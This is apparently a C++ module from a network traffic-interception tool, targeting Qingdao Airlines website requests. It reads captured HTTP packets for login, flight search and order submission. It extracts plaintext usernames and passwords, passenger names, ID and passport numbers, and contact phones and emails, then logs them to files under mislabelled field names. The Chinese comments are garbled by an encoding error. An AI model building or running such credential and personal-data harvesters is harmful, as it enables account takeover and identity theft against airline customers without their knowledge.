
#include "StdAfx.h"

#include "PlaneQingDaoAirlines.h"

plane::QingDaoAirlines::QingDaoAirlines(HttpSession *http_session, const string &pro_name) : Airplane(http_session,pro_name)
{
	
}

plane::QingDaoAirlines::~QingDaoAirlines()
{
	
}

// 0 ���֤��1 ���գ�2 ����֤ 3 ����֤ 4 ̨��֤ 5�۰�ͨ��֤ 6 ����֤ 7 ʿ��֤
string plane::QingDaoAirlines::GetIdType(string idType)
{
	string idTypeTrue;
	if (idType == "0"){idTypeTrue = "���֤";}
	if (idType == "1"){idTypeTrue = "����";}
	if (idType == "2"){idTypeTrue = "����֤";}
	if (idType == "3"){idTypeTrue = "����֤";}
	if (idType == "4"){idTypeTrue = "̨��֤";}
	if (idType == "5"){idTypeTrue = "�۰�ͨ��֤";}
	if (idType == "6"){idTypeTrue = "����֤";}
	if (idType == "7"){idTypeTrue = "ʿ��֤";}
	return idTypeTrue;
}

int plane::QingDaoAirlines::IsQingDaoAirlines(HttpSession *http_session)
{
	//��¼
	if((http_session->m_Requestline.m_Host.Find("www.qdairlines.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/ffpService.do")!=-1) )
	{
		return kpclogin;
	}
	//�г�Ԥ��
	if((http_session->m_Requestline.m_Host.Find("www.qdairlines.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/FlightSearch.do")!=-1))
	{
		return kpcticket;
	}
	//�ύ����
	if((http_session->m_Requestline.m_Host.Find("www.qdairlines.com")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/PaxInfoInput.do")!=-1))
	{
		return kpcorder;
	}
	return 0;
}

int plane::QingDaoAirlines::Process(const char *packet,int action)
{
	//��¼
	if (action == kpclogin)
	{
		return pclogin(packet);
	}
	//�г�Ԥ��
	if (action == kpcticket)
	{
		return pcticket(packet);
	}
	//��¼
	if (action == kpcorder)
	{
		return pcorder(packet);
	}
	return 1;
}

//��¼
int plane::QingDaoAirlines::pclogin(const char *packet)
{
	string src_data(packet);
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	username = ms_->GetValueFromMapByKey("user",true);
	password = ms_->GetValueFromMapByKey("pwd",true);
	if (username.empty() || password.empty())
	{
		return 0;
	}
	output_text_ = 
		"user=" + username +"\r\n" + //�˺�
		"pass=" + password + "\r\n" + //����
		"state=��¼\r\n";
	WriteIndexFile();
	return 1;
}

// �г�Ԥ��
int plane::QingDaoAirlines::pcticket(const char *packet)
{
	string src_data(packet);
	src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	adtCount = ms_->GetValueFromMapByKey("adt",true);
	chdCount = ms_->GetValueFromMapByKey("chd",true);
	string journeyType = ms_->GetValueFromMapByKey("journeyType",true);
	if (journeyType == "OW")
	{
		//����
		deptDt = ms_->GetValueFromMapByKey("depDate",true);
		deptCdTxt = ms_->GetValueFromMapByKey("orgCityInput",true);
		arrCdTxt = ms_->GetValueFromMapByKey("destCityInput",true);
		if (deptDt.empty() || deptCdTxt.empty() || arrCdTxt.empty())
		{
			return 0;
		}
		output_text_ =
			"netmark=" +adtCount + "\r\n" + //��������
			"onick=" +	chdCount + "\r\n" + //��ͯ����
			"nick=" +	deptCdTxt + "\r\n" + //������
			"msg=" + 	arrCdTxt + "\r\n" + //Ŀ�ĵ� 
			"servername=" + deptDt + "\r\n" + //��������
			"state=��ѯ\r\n";
		WriteIndexFile();
	}
	if (journeyType == "RT")
	{
		deptDt = ms_->GetValueFromMapByKey("depDate",true);
		deptCdTxt = ms_->GetValueFromMapByKey("orgCityInput",true);
		arrCdTxt = ms_->GetValueFromMapByKey("destCityInput",true);
		string retDate = ms_->GetValueFromMapByKey("retDate",true);
		if (deptDt.empty() || deptCdTxt.empty() || arrCdTxt.empty() || retDate.empty())
		{
			return 0;
		}
		output_text_ =
			"netmark=" +adtCount + "\r\n" + //��������
			"sex=" +	chdCount + "\r\n" + //��ͯ����
			"nick=" +	deptCdTxt + "\r\n" + //������
			"msg=" + 	arrCdTxt + "\r\n" + //Ŀ�ĵ� 
			"servername=" + deptDt + "\r\n" + //��������
			"appname=" +  retDate + "\r\n" + //��������
			"state=��ѯ\r\n";
		WriteIndexFile();
	}
	return 1;
}
//�ύ����
int plane::QingDaoAirlines::pcorder(const char *packet)
{
	string src_data(packet);
	if (src_data.rfind("\r\n")!=string::npos)
	{
		src_data = src_data.substr(src_data.rfind("\r\n")+strlen("\r\n"));
	}
	src_data = ms_->UTF8ToGBK(UrlDecode(src_data));
	ms_->SplitStringToMap(src_data,'&','=');
	//��������
	string adult_num = ms_->GetValueFromMapByKey("adult_num",true);
	//��ͯ����
	string child_num = ms_->GetValueFromMapByKey("child_num",true);
	int adnum = atoi(adult_num.c_str());
	int chidnum = atoi(child_num.c_str());
	//��ȡ��ϵ����Ϣ
	string con_ming = ms_->GetValueFromMapByKey("con_ming",true);
	string con_mobile = ms_->GetValueFromMapByKey("con_mobile",true);
	string con_email = ms_->GetValueFromMapByKey("con_email",true);
	if (con_ming.empty() || con_mobile.empty() || con_email.empty())
	{
		return 0;
	}
	//�����˳˿�
	for (int i = 0;i<adnum;i++)
	{
		//����
		string adult_ming;
		//֤����
		string adult_pspt;
		//֤������
		string adultIdType;
		stringstream ss;
		stringstream sss;
		stringstream ssss;

		ss<<"adult_ming"<<i;
		sss<<"adult_pspt"<<i;
		ssss<<"adultIdType"<<i;
		adult_ming = ms_->GetValueFromMapByKey(ss.str(),true);
		adult_pspt = ms_->GetValueFromMapByKey(sss.str(),true);
		adultIdType = ms_->GetValueFromMapByKey(ssss.str(),true);
		adultIdType = this->GetIdType(adultIdType);
		output_text_ =
			"mid=" + 	con_ming + "\r\n" +		//��ϵ������
			"oid=" + 	con_mobile + "\r\n" +	//��ϵ�˵绰
			"imsi=" +  con_email + "\r\n" +		//��ϵ������
			"msgtype=" + adult_ming + "\r\n" +	//�˿�����
			"webname=" + adult_pspt + "\r\n" +	//�˿�֤������
			"subject=" + adultIdType + "\r\n" + //�˿�֤����
			"state=�ύ����\r\n";
		WriteIndexFile();

	}
	//Ӥ���˿�
	for(int j=0;j<chidnum;j++)
	{
		stringstream ss;
		stringstream sss;
		stringstream ssss;

		string child_ming;
		string child_pspt;
		string chileType;

		ss<<"child_ming"<<j;
		sss<<"child_pspt"<<j;
		ssss<<"childIdType"<<j;
		child_ming = ms_->GetValueFromMapByKey(ss.str(),true);
		child_pspt = ms_->GetValueFromMapByKey(sss.str(),true);
		chileType = ms_->GetValueFromMapByKey(ssss.str(),true);
		chileType = this->GetIdType(chileType);
		if (child_ming.empty() || child_pspt.empty())
		{
			return 0;
		}
		output_text_ =
			"mid=" + 	con_ming + "\r\n" +		//��ϵ������
			"oid=" + 	con_mobile + "\r\n" +	//��ϵ�˵绰
			"imsi=" +  con_email + "\r\n" +		//��ϵ������
			"msgtype=" + child_ming + "\r\n" +	//�˿�����
			"webname=" + child_pspt + "\r\n" +	//�˿�֤������
			"subject=" + chileType + "\r\n" +	//�˿�֤����
			"state=�ύ����\r\n";
		WriteIndexFile();
	}
	return 1;
}
